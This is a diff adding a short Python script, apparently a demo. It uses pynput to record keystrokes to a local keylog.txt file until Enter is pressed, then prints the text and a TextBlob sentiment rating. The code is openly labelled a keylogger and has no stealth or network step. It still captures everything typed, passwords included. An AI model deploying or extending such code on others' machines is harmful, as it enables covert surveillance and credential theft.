@@ -1,0 +1,50 @@
+from pynput.keyboard import Key, Listener
+from textblob import TextBlob
+
+logged_keys = []
+log_file = "keylog.txt"
+
+# Keylogger function
+def on_press(key):
+    try:
+        logged_keys.append(key.char)
+        write_to_file(log_file, key.char)
+    except AttributeError:
+        if key == Key.space:
+            logged_keys.append(' ')
+            write_to_file(log_file, ' ')
+        elif key == Key.enter:
+            write_to_file(log_file, '\n')
+        else:
+            logged_keys.append(' ' + str(key) + ' ')
+            write_to_file(log_file, str(key))
+
+def on_release(key):
+    if key == Key.enter:
+        process_logged_text()
+        return False
+
+def process_logged_text():
+    logged_text = ''.join(logged_keys)
+    print("Logged Text:", logged_text)
+
+    analyze_sentiment(logged_text)
+
+
+def analyze_sentiment(text):
+    blob = TextBlob(text)
+    sentiment_score = blob.sentiment.polarity
+    if sentiment_score > 0:
+        print("Sentiment: Positive")
+    elif sentiment_score < 0:
+        print("Sentiment: Negative")
+    else:
+        print("Sentiment: Neutral")
+
+def write_to_file(filename, content):
+    with open(filename, "a") as file:
+        file.write(content)
+
+# Start keylogger
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
